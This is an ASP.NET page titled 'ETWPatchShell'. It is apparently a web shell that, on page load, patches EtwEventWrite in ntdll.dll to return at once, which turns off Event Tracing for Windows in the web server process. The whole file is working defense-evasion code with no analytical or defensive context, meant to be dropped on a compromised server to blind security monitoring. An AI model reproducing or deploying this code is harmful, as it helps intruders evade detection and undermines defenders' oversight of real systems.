<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    protected void Page_Load(object sender, EventArgs e)
    {
        // Patch EtwEventWrite in ntdll.dll
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProtect;
        VirtualProtect(etwAddr, 1, 0x40, out oldProtect);
        Marshal.WriteByte(etwAddr, 0xC3); // RET
        VirtualProtect(etwAddr, 1, oldProtect, out oldProtect);
        Response.Write("ETW patched (EtwEventWrite -> ret).");
    }
</script>
<html><body><h2>ETWPatchShell</h2><p>ETW user‑land hook disabled.</p></body></html>
